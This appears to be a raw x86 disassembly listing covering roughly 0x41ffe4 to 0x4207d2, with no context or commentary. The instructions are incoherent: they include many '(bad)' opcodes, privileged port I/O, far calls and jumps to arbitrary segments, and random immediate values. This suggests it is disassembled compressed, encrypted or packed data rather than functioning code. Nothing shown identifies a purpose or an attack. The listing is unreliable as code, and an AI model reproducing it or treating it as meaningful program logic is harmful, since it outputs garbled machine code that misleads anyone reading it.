  41ffe4:	xor    eax,0xbdc5578
  41ffe9:	pop    ecx
  41ffea:	test   eax,0xd4e1d387
  41ffef:	dec    ecx
  41fff0:	ror    DWORD PTR [ebx],cl
  41fff2:	or     al,0xc3
  41fff4:	aas    
  41fff5:	call   0xa826:0x58bfe35d
  41fffc:	pop    ebp
  41fffd:	inc    esi
  41fffe:	jns    0x41ffb4
  420000:	pop    esi
  420001:	xchg   esi,eax
  420002:	jb     0x420013
  420004:	push   0x6e733608
  420009:	push   eax
  42000a:	add    BYTE PTR [edx-0x2b],0x55
  42000e:	(bad)  
  420010:	inc    edx
  420011:	ret    
  420012:	loope  0x41ffca
  420014:	pop    eax
  420015:	jecxz  0x41ffa3
  420017:	push   ebp
  420018:	cmp    al,BYTE PTR [ebx-0x1d]
  42001b:	lea    ebp,[ebx+0x3b]
  42001e:	dec    edx
  42001f:	and    BYTE PTR [edx+0x42],dl
  420022:	mov    eax,0x75ffd7e1
  420027:	add    eax,0x727adce
  42002c:	push   0xbe587093
  420031:	push   edx
  420032:	sbb    DWORD PTR [ebp-0x3402b31a],ebx
  420038:	pop    ebx
  420039:	push   esp
  42003a:	jbe    0x420042
  42003c:	addr16 inc edx
  42003e:	jg     0x42005b
  420040:	pop    edi
  420041:	mov    bh,0x7f
  420043:	call   0xe729509d
  420048:	add    BYTE PTR [eax+0x9],0x75
  42004c:	jnp    0x42005b
  42004e:	jl     0x420031
  420050:	pop    eax
  420051:	or     al,0x3
  420053:	ror    cl,0xf8
  420056:	push   esi
  420057:	mov    dh,0xab
  420059:	xor    al,0x6c
  42005b:	mov    al,ds:0xe5fb0878
  420060:	call   0x7adc:0xa8204cd7
  420067:	mov    dh,BYTE PTR [eax]
  420069:	enter  0xdea4,0x38
  42006d:	sub    cl,BYTE PTR [ebp-0x12cc4d09]
  420073:	mov    al,ds:0x56ab1b62
  420078:	outs   dx,BYTE PTR ds:[esi]
  420079:	pushf  
  42007a:	fadd   st,st(4)
  42007c:	mov    eax,ds:0xa264781b
  420081:	loop   0x420045
  420083:	push   ss
  420084:	mov    ds:0x63b4a425,al
  420089:	icebp  
  42008a:	dec    ecx
  42008b:	popa   
  42008c:	jae    0x42000f
  42008e:	je     0x4200b5
  420090:	jge    0x4200af
  420092:	das    
  420093:	mov    ds:0xd806bed9,eax
  420098:	dec    esi
  420099:	in     eax,dx
  42009a:	lea    ecx,[ebp-0x54e27586]
  4200a0:	fsubr  st,st(4)
  4200a2:	lea    ebx,[esi]
  4200a4:	shl    ebp,1
  4200a6:	retf   
  4200a7:	sub    al,0x5f
  4200a9:	or     DWORD PTR [ecx],ecx
  4200ab:	mov    dh,0xfe
  4200ad:	mov    ebp,0x4cf1193d
  4200b2:	nop
  4200b3:	dec    edi
  4200b4:	pop    edx
  4200b5:	mov    ecx,DWORD PTR [esi]
  4200b7:	test   eax,0x1821a08e
  4200bc:	cmp    bl,BYTE PTR [eax+0x1f2a3316]
  4200c2:	fistp  DWORD PTR [esi+edx*8+0x425ff3b9]
  4200c9:	push   edi
  4200ca:	ds ja  0x4200b4
  4200cd:	push   0x63
  4200cf:	jge    0x42009a
  4200d1:	in     eax,dx
  4200d2:	ds in  eax,0xd2
  4200d5:	xor    DWORD PTR [ebp+0x7ce2ef81],0x68
  4200dc:	lea    si,[ecx]
  4200df:	xchg   edi,eax
  4200e0:	push   0x2804566b
  4200e5:	ficom  WORD PTR ds:0x76e41363
  4200eb:	mov    ecx,0x98fac832
  4200f0:	mov    ds:0x9e3ef4aa,al
  4200f5:	inc    ebp
  4200f6:	inc    esp
  4200f7:	int    0xc4
  4200f9:	das    
  4200fa:	add    bh,BYTE PTR [ecx-0x7cf1b5dc]
  420100:	cmp    al,0x9e
  420102:	and    al,0xb5
  420104:	ret    
  420105:	cmp    esi,DWORD PTR [eax+0x5d]
  420108:	inc    esi
  420109:	jo     0x420107
  42010b:	daa    
  42010c:	jns    0x420119
  42010e:	int3   
  42010f:	mov    esp,0x3899896
  420114:	(bad)  [edx+eiz*8]
  420117:	repz push edi
  420119:	xor    DWORD PTR [edx],ebp
  42011b:	int3   
  42011c:	mov    dl,0xaa
  42011e:	or     edx,DWORD PTR gs:[esp+edi*8]
  420122:	push   edi
  420123:	add    bh,BYTE PTR [ecx-0x3a]
  420126:	ret    
  420127:	bound  ebp,QWORD PTR [ecx+ebx*2-0x65]
  42012b:	mov    fs,edi
  42012d:	fistp  WORD PTR [ebp-0xe970c0c]
  420133:	inc    eax
  420135:	jl     0x420168
  420137:	in     al,0x66
  420139:	xchg   dx,ax
  42013b:	pop    ebp
  42013c:	jmp    0x1397d3c5
  420141:	jne    0x4200dc
  420143:	in     al,0xda
  420145:	sub    ecx,edi
  420147:	aas    
  420148:	repnz aas 
  42014a:	js     0x420136
  42014c:	mov    ecx,DWORD PTR [edi]
  42014e:	lods   eax,DWORD PTR ds:[esi]
  42014f:	mov    al,0x73
  420151:	push   ebx
  420152:	xchg   esp,eax
  420153:	xchg   ebx,edx
  420155:	rol    BYTE PTR [ebx-0x42c6f7c],cl
  42015b:	pop    ss
  42015c:	stc    
  42015d:	int    0x4b
  42015f:	cmc    
  420160:	nop
  420161:	sar    BYTE PTR [edi+ecx*1],cl
  420164:	popw   ds
  420166:	push   0xf4ac6174
  42016b:	jl     0x4201cb
  42016d:	mov    ecx,0x36c4eb3a
  420172:	jle    0x42014f
  420174:	retf   
  420175:	ins    BYTE PTR es:[edi],dx
  420176:	mov    ebx,0x1dcd35ec
  42017b:	fdivr  QWORD PTR [ebx]
  42017d:	fwait
  42017e:	sbb    bh,BYTE PTR [edx]
  420180:	ret    0xdcfd
  420183:	adc    bh,BYTE PTR [eax]
  420185:	cmc    
  420186:	sbb    dh,ah
  420188:	pop    ebp
  420189:	jecxz  0x4201fd
  42018b:	loope  0x42010f
  42018d:	retf   
  42018e:	dec    eax
  42018f:	mov    ecx,DWORD PTR fs:[ebp+edi*2-0x68039b03]
  420197:	sub    al,0xdd
  420199:	sub    ch,BYTE PTR [esi]
  42019b:	xor    BYTE PTR [esi],ch
  42019d:	sub    esp,DWORD PTR [edx+0x536a94d7]
  4201a3:	mov    al,ds:0xd629cb5a
  4201a8:	jne    0x420193
  4201aa:	cmp    dh,BYTE PTR fs:[esp+eiz*4-0x3f0ad442]
  4201b2:	xchg   ecx,eax
  4201b3:	push   esp
  4201b4:	dec    edx
  4201b5:	push   edx
  4201b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201b7:	std    
  4201b8:	dec    ebp
  4201b9:	adc    esi,DWORD PTR [ebx+0x63bf3bcc]
  4201bf:	pop    edx
  4201c0:	out    0x42,al
  4201c2:	adc    esi,DWORD PTR [eiz*4-0x65d08a5c]
  4201c9:	mov    edx,0x1c7dbad5
  4201ce:	and    al,0x32
  4201d0:	aad    0x8c
  4201d2:	cmc    
  4201d3:	jl     0x420179
  4201d5:	lahf   
  4201d6:	pop    esp
  4201d7:	hlt    
  4201d8:	pop    edx
  4201d9:	popf   
  4201da:	adc    ecx,esp
  4201dc:	sub    eax,0x24d93b20
  4201e1:	xor    cl,dl
  4201e3:	jae    0x4201d3
  4201e5:	cld    
  4201e6:	(bad)  
  4201e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201e8:	je     0x420182
  4201ea:	in     al,dx
  4201eb:	aas    
  4201ec:	push   ss
  4201ed:	jb     0x4201da
  4201ef:	xor    al,0xd6
  4201f1:	sti    
  4201f2:	loope  0x42023f
  4201f4:	call   FWORD PTR [edi+0x13]
  4201f7:	push   0xaafa135b
  4201fc:	leave  
  4201fd:	mov    ebp,0x20c40552
  420202:	jge    0x4201a4
  420204:	pusha  
  420205:	adc    DWORD PTR [ecx+0x75],ebx
  420208:	div    DWORD PTR [ecx-0x6b]
  42020b:	std    
  42020c:	mov    edi,0xdeb94929
  420211:	mov    ds:0xf9a3b082,eax
  420216:	mov    eax,ds:0xba12785d
  42021b:	fwait
  42021c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42021d:	repz fs inc esp
  420220:	add    al,0x54
  420222:	add    al,0x6d
  420224:	or     DWORD PTR [esi+ebp*4+0x353ea083],ebp
  42022b:	fs ss cdq 
  42022e:	shr    BYTE PTR [ebx-0x7d4cb1ec],0xd7
  420235:	and    eax,0x5f8b929f
  42023a:	jg     0x42020a
  42023c:	into   
  42023d:	leave  
  42023e:	sbb    bh,BYTE PTR [ebp+edx*1-0x3f76517f]
  420245:	ret    
  420246:	cmp    eax,0x770af602
  42024b:	jge    0x4202bb
  42024d:	inc    esi
  42024e:	dec    esp
  42024f:	aam    0x5f
  420251:	cmp    bl,BYTE PTR [ebp-0x66ad2cd8]
  420257:	lock push ecx
  420259:	or     ecx,0xec070658
  42025f:	xor    BYTE PTR [ecx+0x14d01cfe],0xe3
  420266:	sub    ch,BYTE PTR [ebx+0x1f8b7a40]
  42026c:	cmp    BYTE PTR [edx-0x29],cl
  42026f:	push   ebp
  420270:	and    ch,BYTE PTR [ebp-0x5e]
  420273:	adc    eax,0xa53e4cee
  420278:	jo     0x420201
  42027a:	leave  
  42027b:	icebp  
  42027c:	pop    ebx
  42027d:	pop    ds
  42027e:	aad    0x61
  420280:	fsub   QWORD PTR [ecx+0x29]
  420283:	xor    eax,0x29100f28
  420288:	cdq    
  420289:	hlt    
  42028a:	add    BYTE PTR [esi],ch
  42028c:	mov    eax,ds:0xa0eac193
  420291:	loop   0x4202c2
  420293:	call   0xce72c02f
  420298:	sbb    eax,0x8312b36b
  42029d:	mov    ch,0xf9
  42029f:	fisttp QWORD PTR [esp+ecx*4]
  4202a2:	fiadd  DWORD PTR fs:[edx+0x42b540a6]
  4202a9:	mov    ebp,0x10aa825f
  4202ae:	pop    ds
  4202af:	sar    eax,1
  4202b1:	cs or  ecx,ebx
  4202b4:	sahf   
  4202b5:	enter  0x7409,0xe9
  4202b9:	dec    esp
  4202ba:	fwait
  4202bb:	enter  0xaa88,0x58
  4202bf:	or     DWORD PTR [eax+0x45],edi
  4202c2:	pop    esi
  4202c3:	data16 jno 0x42025e
  4202c6:	fmulp  st(5),st
  4202c8:	lods   eax,DWORD PTR ds:[esi]
  4202c9:	call   0x6aa33139
  4202ce:	inc    edi
  4202cf:	retf   0x2d1d
  4202d2:	pop    es
  4202d3:	jno    0x4202e0
  4202d5:	sub    bh,BYTE PTR [ebp-0x44]
  4202d8:	pop    ecx
  4202d9:	xchg   ebp,edx
  4202db:	mov    ebx,0x8e68b666
  4202e0:	not    BYTE PTR ds:0xc53f3568
  4202e6:	scas   al,BYTE PTR es:[edi]
  4202e7:	rcr    ecx,cl
  4202e9:	movd   mm3,DWORD PTR [ecx]
  4202ec:	pop    ss
  4202ed:	jl     0x4202c4
  4202ef:	mov    bh,0x20
  4202f1:	shl    BYTE PTR [eax-0x51403995],1
  4202f7:	mov    eax,ds:0x17ad97f1
  4202fc:	dec    ebp
  4202fd:	imul   ebx,esp,0x24
  420300:	out    0x23,al
  420302:	js     0x42033a
  420304:	inc    ecx
  420305:	inc    edx
  420306:	pop    ebx
  420307:	sbb    ah,BYTE PTR [ecx+ebp*2+0x5215f05d]
  42030e:	fcmovnbe st,st(5)
  420310:	push   es
  420311:	sahf   
  420312:	dec    esi
  420313:	bound  ebx,QWORD PTR ds:0xdc639644
  420319:	inc    ebx
  42031a:	(bad)  
  42031b:	int    0x9a
  42031d:	inc    BYTE PTR [ecx]
  42031f:	jmp    0x4202f7
  420321:	add    BYTE PTR [edi],ah
  420323:	cld    
  420324:	out    dx,eax
  420325:	sub    eax,0x66e634ba
  42032a:	imul   ecx,DWORD PTR [esi+esi*4+0x3],0xffffff85
  42032f:	stc    
  420330:	cs je  0x4202c3
  420333:	adc    al,0x9
  420335:	pop    es
  420336:	sbb    eax,0xa8c0bf30
  42033b:	mov    fs,edi
  42033d:	fnstsw WORD PTR [ecx+0x5f]
  420340:	popf   
  420341:	leave  
  420342:	or     al,al
  420344:	in     eax,0x96
  420346:	pop    edi
  420347:	(bad)  
  420348:	mov    cl,0xf2
  42034a:	pop    ebp
  42034b:	imul   DWORD PTR [ecx+ebx*2]
  42034e:	xchg   ebp,eax
  42034f:	cmp    eax,0x9cc4dae2
  420354:	dec    eax
  420355:	mov    dh,0x27
  420357:	push   ds
  420358:	shl    DWORD PTR [ebx+0x3f],1
  42035b:	xlat   BYTE PTR ds:[ebx]
  42035c:	inc    ebx
  42035d:	arpl   WORD PTR [ebx+0x53],ax
  420360:	push   esp
  420361:	inc    edi
  420362:	inc    ebx
  420363:	pushf  
  420364:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420365:	inc    ebp
  420366:	push   esi
  420367:	or     DWORD PTR [esi],edi
  420369:	daa    
  42036a:	inc    esi
  42036b:	div    cl
  42036d:	sbb    eax,0x80195d8
  420372:	repz dec ebp
  420374:	xor    BYTE PTR [ecx],ch
  420376:	mov    ah,0x92
  420378:	and    DWORD PTR [eax+0x4259dda7],edi
  42037e:	in     al,dx
  42037f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420380:	add    BYTE PTR [edi],ch
  420382:	or     eax,0x7b279ff5
  420387:	inc    ecx
  420388:	sbb    eax,0xc9daddfe
  42038d:	retf   
  42038e:	in     eax,0x6b
  420390:	inc    ebx
  420391:	push   0x945241a0
  420396:	sbb    eax,0xfbfabe94
  42039b:	sub    al,0xc3
  42039d:	xor    bh,BYTE PTR [ebx-0x7]
  4203a0:	mov    bl,0xc
  4203a2:	adc    ecx,DWORD PTR [edx]
  4203a4:	mov    ah,0xd4
  4203a6:	dec    ecx
  4203a7:	mov    ch,0xf2
  4203a9:	aaa    
  4203aa:	in     eax,0x81
  4203ac:	mov    ah,dl
  4203ae:	inc    edx
  4203af:	clc    
  4203b0:	xchg   edi,eax
  4203b1:	and    ch,cl
  4203b3:	add    al,0x80
  4203b5:	jge    0x42033a
  4203b7:	xchg   esp,eax
  4203b8:	and    al,0xb7
  4203ba:	mov    esi,0x973abd76
  4203bf:	dec    eax
  4203c0:	mov    esp,0x10b46a1a
  4203c5:	ror    DWORD PTR [eax-0x6a],0x9
  4203c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203ca:	lahf   
  4203cb:	pop    esp
  4203cc:	mov    eax,0x90ff3ea
  4203d1:	pop    esp
  4203d2:	sbb    ecx,DWORD PTR [edi+ebp*1+0x7a]
  4203d6:	jge    0x420409
  4203d8:	in     al,0x95
  4203da:	popa   
  4203db:	push   DWORD PTR [esi]
  4203dd:	in     eax,0xad
  4203df:	pop    ss
  4203e0:	mov    ecx,0xe9f1e154
  4203e5:	mov    esi,0xb1dbce3a
  4203ea:	div    BYTE PTR [ebp-0x53679fd0]
  4203f0:	mov    edx,0x6df15c40
  4203f5:	jge    0x420422
  4203f7:	ret    
  4203f8:	or     eax,0xbd857eb5
  4203fd:	xor    DWORD PTR [edi-0x55],eax
  420400:	sbb    eax,0x91ea4395
  420405:	cmp    eax,0x3729b33
  42040a:	mov    cl,0x8e
  42040c:	sbb    al,0xb6
  42040e:	idiv   DWORD PTR [esp+ebp*8-0x47]
  420412:	xchg   esp,eax
  420413:	ror    DWORD PTR [ecx+0x540e9f7a],cl
  420419:	sub    BYTE PTR [edx+edi*8-0x58],0x14
  42041e:	cmp    al,0x5f
  420420:	xrelease mov DWORD PTR [esi+0x65],ecx
  420424:	jge    0x4203d1
  420426:	clc    
  420427:	lahf   
  420428:	iret   
  420429:	mov    ecx,0xc9162ceb
  42042e:	or     eax,0x9a02dec4
  420433:	popa   
  420434:	sbb    edi,ecx
  420436:	sbb    DWORD PTR [edx+0x5a],eax
  420439:	int    0x5e
  42043b:	ret    
  42043c:	sbb    eax,0xadd2c50d
  420441:	popa   
  420442:	in     al,0x2e
  420444:	mov    ebx,0x19acdf69
  420449:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42044a:	push   es
  42044b:	adc    dl,ah
  42044d:	mov    bl,0x83
  42044f:	push   ebp
  420450:	pop    eax
  420451:	jp     0x42049c
  420453:	stos   DWORD PTR es:[edi],eax
  420454:	sub    dh,0x7a
  420457:	jne    0x4204cd
  420459:	and    eax,0x733f8bb6
  42045e:	aas    
  42045f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420460:	inc    esi
  420461:	or     al,0xcb
  420463:	test   DWORD PTR [esi],eax
  420465:	scas   eax,DWORD PTR es:[edi]
  420466:	mov    ebp,0xc686d414
  42046b:	push   cs
  42046c:	pop    esi
  42046d:	pop    esp
  42046e:	dec    esp
  42046f:	repnz pop esp
  420471:	scas   eax,DWORD PTR es:[edi]
  420472:	icebp  
  420473:	or     BYTE PTR [esi+ecx*2+0x6d],dl
  420477:	loopne 0x420493
  420479:	mov    dh,0xf5
  42047b:	fwait
  42047c:	mov    ebp,0xf7219017
  420481:	jle    0x4204fb
  420483:	pop    eax
  420484:	adc    al,BYTE PTR [ecx-0x69]
  420487:	xabort 0x5c
  42048a:	inc    esi
  42048b:	or     al,0x52
  42048d:	push   ebp
  42048e:	cmp    BYTE PTR [edi],dh
  420490:	pop    ds
  420491:	mov    dl,0xa9
  420493:	lea    esi,[edx-0x1b]
  420496:	sar    DWORD PTR [edx-0x5c8553cd],0xe3
  42049d:	stc    
  42049e:	sbb    BYTE PTR [ebp+0x5c],dl
  4204a1:	aad    0x3e
  4204a3:	jo     0x4204ad
  4204a5:	int    0x5d
  4204a7:	mov    ch,0xc6
  4204a9:	jo     0x420481
  4204ab:	aas    
  4204ac:	cs and al,0xab
  4204af:	jno    0x420476
  4204b1:	mov    ebx,esp
  4204b3:	dec    eax
  4204b4:	mov    DWORD PTR [edx-0x1ddc4465],edi
  4204ba:	push   edi
  4204bb:	jnp    0x4204fb
  4204bd:	push   0x1121446a
  4204c2:	mov    ah,0x33
  4204c4:	int    0x4
  4204c6:	bound  edi,QWORD PTR ds:0xd05b3988
  4204cc:	jle    0x420452
  4204ce:	and    edx,ebp
  4204d0:	test   DWORD PTR [ebx-0x11103a2d],eax
  4204d6:	lahf   
  4204d7:	sub    DWORD PTR [esi],edx
  4204d9:	xchg   esp,eax
  4204db:	call   0x3762:0xe41b899
  4204e2:	imul   ebp,DWORD PTR [edi+0x1],0xffffffa1
  4204e6:	dec    esp
  4204e7:	inc    ebp
  4204e8:	and    esp,ecx
  4204ea:	outs   dx,DWORD PTR ds:[esi]
  4204eb:	nop
  4204ec:	std    
  4204ed:	sbb    ebx,edx
  4204ef:	dec    ebx
  4204f0:	sbb    BYTE PTR ds:0x2c4c24f2,dl
  4204f6:	out    dx,eax
  4204f7:	dec    edi
  4204f8:	mov    bl,0x48
  4204fa:	sar    cl,cl
  4204fc:	rol    ebp,0xf9
  4204ff:	sar    DWORD PTR [ebx],0x6e
  420502:	scas   eax,DWORD PTR es:[edi]
  420503:	scas   eax,DWORD PTR es:[edi]
  420504:	test   al,0x8a
  420506:	fucomi st,st(4)
  420508:	test   al,0xb9
  42050a:	xor    BYTE PTR [eax+ebp*2],cl
  42050d:	xor    al,0x26
  42050f:	push   edi
  420510:	outs   dx,DWORD PTR ds:[esi]
  420511:	jl     0x42053e
  420513:	lock push ecx
  420515:	xchg   edx,eax
  420516:	mov    dh,BYTE PTR [edx+esi*4]
  420519:	fs push ebx
  42051b:	mov    ds:0x4d129c99,al
  420520:	add    DWORD PTR [esi],edi
  420522:	add    eax,0x189373c
  420527:	adc    dh,BYTE PTR [edx+0x224ea3a2]
  42052d:	icebp  
  42052e:	mov    ch,0x6c
  420530:	inc    esi
  420531:	mov    ecx,0x2fbfc663
  420536:	mov    ds:0xcbb01c76,al
  42053b:	fs mov ebp,0xe18b8d9f
  420541:	mov    dh,0xca
  420543:	imul   edx,DWORD PTR [ebp+0x17],0x8c7d908e
  42054a:	xor    DWORD PTR [ecx+0xf],ebx
  42054d:	lods   al,BYTE PTR ds:[esi]
  42054e:	lds    ecx,FWORD PTR [edi-0x19da044]
  420554:	xor    esp,DWORD PTR [edx-0x62590e04]
  42055a:	mov    esp,0x31056433
  42055f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420560:	xchg   edi,eax
  420561:	push   esi
  420562:	loopne 0x4205e3
  420564:	test   ah,0x77
  420567:	xchg   ecx,eax
  420568:	lods   al,BYTE PTR ds:[esi]
  420569:	jecxz  0x42051d
  42056b:	mov    cl,0xda
  42056d:	adc    ebp,DWORD PTR [edx+0x783e820b]
  420573:	jns    0x420587
  420575:	std    
  420576:	xchg   BYTE PTR [esi],ch
  420578:	lea    edx,[edi-0x3c83f41f]
  42057e:	dec    esi
  42057f:	or     eax,0x232404d7
  420584:	adc    edx,DWORD PTR [esi+eax*4+0x71]
  420588:	xor    eax,0x1d520e48
  42058d:	jb     0x420533
  42058f:	sub    eax,0xb5c123ba
  420594:	mov    dl,0x3e
  420596:	xchg   DWORD PTR [esp+ecx*2+0x384ea3f1],edx
  42059d:	or     eax,0xbb152106
  4205a2:	repnz std 
  4205a4:	sub    al,0xb
  4205a6:	pop    esp
  4205a7:	adc    bh,BYTE PTR [edi-0x2a]
  4205aa:	mov    ch,0xc0
  4205ac:	or     al,0xee
  4205ae:	lock or BYTE PTR gs:[eax],bh
  4205b2:	ss and dl,bl
  4205b5:	or     DWORD PTR [ebx+0x4a],esi
  4205b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205b9:	xchg   edi,eax
  4205ba:	ins    DWORD PTR es:[edi],dx
  4205bb:	lock pop ecx
  4205bd:	mov    ds:0xc532e215,al
  4205c2:	dec    ebp
  4205c3:	jmp    0x4205d7
  4205c5:	sub    esi,DWORD PTR [ebx+0x54]
  4205c8:	ins    BYTE PTR es:[edi],dx
  4205c9:	mov    edx,0x363f0fe6
  4205ce:	test   eax,0xb35f81d3
  4205d3:	sbb    BYTE PTR [ebp-0x7a],dh
  4205d6:	ds mov esi,0x4020ac08
  4205dc:	repnz inc esi
  4205de:	scas   al,BYTE PTR es:[edi]
  4205df:	jno    0x42059c
  4205e1:	xchg   esi,eax
  4205e2:	xor    DWORD PTR [ecx+0x231d2779],ebp
  4205e8:	ficom  WORD PTR [ebp-0x1dbc9417]
  4205ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205ef:	std    
  4205f0:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4205f2:	sar    edx,0x44
  4205f5:	jge    0x42059e
  4205f7:	sub    al,0xc9
  4205f9:	or     dl,ch
  4205fb:	and    BYTE PTR [ebx+0x7bab87fc],ah
  420601:	jmp    0x420637
  420603:	mov    ebp,0x663c28cc
  420608:	add    eax,0x6f1a4f69
  42060d:	les    esp,FWORD PTR [esi-0x18]
  420610:	js     0x420656
  420612:	xchg   esp,eax
  420613:	xchg   esi,eax
  420614:	dec    esi
  420615:	pop    eax
  420616:	cwde   
  420617:	xchg   edx,eax
  420618:	daa    
  420619:	mov    ah,0x9e
  42061b:	push   0x13
  42061d:	(bad)  
  42061e:	and    cl,BYTE PTR [esi+ebp*1-0x33cb35b9]
  420625:	fmul   QWORD PTR [esi+0x48]
  420628:	mov    esp,0x6a04f1a8
  42062d:	mov    al,ds:0x8298bd00
  420632:	push   eax
  420633:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420634:	jae    0x420636
  420636:	xor    eax,0xb45a7973
  42063b:	mov    eax,0x455244c
  420640:	(bad)  
  420641:	mov    es,WORD PTR [edx]
  420643:	mov    edi,0x1c0ddae0
  420648:	add    BYTE PTR [esi+ebp*4-0x4b],dh
  42064c:	outs   dx,BYTE PTR ds:[esi]
  42064d:	push   es
  42064e:	in     al,dx
  42064f:	iret   
  420650:	add    edx,ebx
  420652:	and    esp,edx
  420654:	push   ecx
  420655:	(bad)  
  420656:	clc    
  420657:	inc    edi
  420658:	rcl    DWORD PTR [ecx+0x6e],1
  42065b:	sub    BYTE PTR [ecx-0x59],dh
  42065e:	cmp    al,0x2b
  420660:	stc    
  420661:	mov    eax,0x41e806d1
  420666:	faddp  st(7),st
  420668:	dec    eax
  420669:	jp     0x420628
  42066b:	ret    
  42066c:	shl    BYTE PTR [eax+0x56],cl
  42066f:	xlat   BYTE PTR ds:[ebx]
  420670:	pop    eax
  420671:	cwde   
  420672:	pop    ds
  420673:	(bad)  
  420674:	mov    esp,0x48c6e9cc
  420679:	ss add al,0x3c
  42067c:	mov    eax,0xe657296f
  420681:	nop
  420682:	push   0x44
  420684:	jns    0x420638
  420686:	and    al,0x39
  420688:	mov    ah,dh
  42068a:	pop    edi
  42068b:	push   esi
  42068c:	js     0x420708
  42068e:	sbb    al,0x9a
  420690:	cwde   
  420691:	jle    0x4206f8
  420693:	mov    dl,0x23
  420695:	jmp    0xc74:0x8cc781d4
  42069c:	mov    edi,DWORD PTR [ebx]
  42069e:	mov    DWORD PTR [edi-0x4c3226e],ecx
  4206a4:	ret    0x464a
  4206a7:	mov    ecx,0xcc4a761d
  4206ac:	mov    ch,0x34
  4206ae:	mov    eax,DWORD PTR [ebx-0x27]
  4206b1:	cli    
  4206b2:	fdiv   QWORD PTR [edi]
  4206b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206b5:	ins    DWORD PTR es:[edi],dx
  4206b6:	inc    esi
  4206b7:	mov    ebx,0x70e5995c
  4206bc:	sbb    eax,0x477dd27d
  4206c1:	mov    WORD PTR gs:[eax+0x24484154],ss
  4206c8:	aas    
  4206c9:	shr    BYTE PTR [edi+ebp*2-0x3b],cl
  4206cd:	outs   dx,BYTE PTR ds:[esi]
  4206ce:	retf   0xaaeb
  4206d1:	int    0xfd
  4206d3:	out    0x2b,al
  4206d5:	inc    ebx
  4206d6:	sub    eax,0x8a99214c
  4206db:	mov    edi,0x1f713bff
  4206e0:	outs   dx,BYTE PTR ds:[esi]
  4206e1:	lea    edx,[ebx]
  4206e3:	mov    cl,0x58
  4206e5:	das    
  4206e6:	jg     0x4206cb
  4206e8:	xchg   ecx,eax
  4206e9:	les    ebp,FWORD PTR [edi-0x77]
  4206ec:	pop    ds
  4206ed:	repnz mov ah,0x21
  4206f0:	push   ss
  4206f1:	int3   
  4206f2:	lods   eax,DWORD PTR ds:[esi]
  4206f3:	shl    BYTE PTR ds:0xe254c2b2,1
  4206f9:	or     eax,0x87617b5f
  4206fe:	inc    esp
  4206ff:	ds adc DWORD PTR es:[ebx],ebx
  420703:	popa   
  420704:	xor    al,0x17
  420706:	inc    edx
  420707:	inc    esi
  420708:	or     DWORD PTR [esi+0x5],esi
  42070b:	ds daa 
  42070d:	pop    ss
  42070e:	in     eax,0x4a
  420710:	(bad)  
  420711:	ins    BYTE PTR es:[edi],dx
  420712:	movq   QWORD PTR [edx+0x78314898],mm1
  420719:	or     al,0xdf
  42071b:	mov    eax,ds:0x5b540a3e
  420720:	cdq    
  420721:	pop    esi
  420722:	(bad)  
  420724:	enter  0xfccb,0x94
  420728:	xchg   esp,eax
  420729:	add    bh,ch
  42072b:	imul   eax,DWORD PTR [eax-0x9493a94],0xbefa65c4
  420735:	lods   al,BYTE PTR ds:[esi]
  420736:	stos   DWORD PTR es:[edi],eax
  420737:	dec    esi
  420738:	jne    0x4206fd
  42073a:	xchg   edi,eax
  42073b:	rcr    BYTE PTR [ecx+eax*8],cl
  42073e:	es xchg ecx,eax
  420740:	ins    DWORD PTR es:[edi],dx
  420741:	push   edi
  420742:	xchg   ebx,eax
  420743:	ror    DWORD PTR [edi],1
  420745:	lahf   
  420746:	shr    DWORD PTR [ecx+0x53],cl
  420749:	push   esi
  42074a:	out    0x2b,eax
  42074c:	pop    es
  42074d:	or     al,0xd0
  42074f:	push   0x4e80031a
  420754:	cwde   
  420755:	mov    esp,0x7c823172
  42075a:	and    esi,DWORD PTR [ecx+edx*8]
  42075d:	mov    ah,0x87
  42075f:	gs aaa 
  420761:	repnz imul esp,DWORD PTR ds:0x45f24a95,0xffffffcd
  420769:	lahf   
  42076a:	jb     0x420763
  42076c:	cs ds xchg esp,eax
  42076f:	jecxz  0x42070c
  420771:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420772:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420773:	jge    0x4207e1
  420775:	push   ebp
  420776:	(bad)  
  420777:	aaa    
  420778:	ins    BYTE PTR es:[edi],dx
  420779:	sbb    DWORD PTR [ecx-0x548f095c],ebx
  42077f:	cmc    
  420780:	jae    0x4207e2
  420782:	in     al,0xa8
  420784:	shl    DWORD PTR [eax],cl
  420786:	lods   al,BYTE PTR ds:[esi]
  420787:	mov    eax,0xd659914c
  42078c:	dec    edi
  42078d:	pop    edi
  42078e:	push   0x714b44e5
  420793:	stc    
  420794:	scas   al,BYTE PTR es:[edi]
  420795:	jb     0x4207c5
  420797:	dec    esp
  420798:	mov    ds:0x22b64430,eax
  42079d:	(bad)  
  42079e:	push   ecx
  42079f:	pop    ecx
  4207a0:	lock add ch,BYTE PTR ds:0x99b09da0
  4207a7:	retf   0xcb04
  4207aa:	mov    bl,0x9f
  4207ac:	mov    bh,0x7a
  4207ae:	inc    edx
  4207af:	or     eax,0x4a05c19f
  4207b4:	xchg   BYTE PTR [edx-0x6e],dh
  4207b7:	xchg   esp,eax
  4207b8:	or     eax,edi
  4207ba:	dec    eax
  4207bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207bc:	mov    bl,0xf0
  4207be:	icebp  
  4207bf:	add    cl,BYTE PTR [ecx+edx*2+0xd]
  4207c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207c4:	jmp    0x9644:0x9e2f19da
  4207cb:	push   esp
  4207cc:	add    esi,DWORD PTR [eax-0x18a5a79f]
  4207d2:	div    DWORD PTR [ebp*1+0xce495e7]
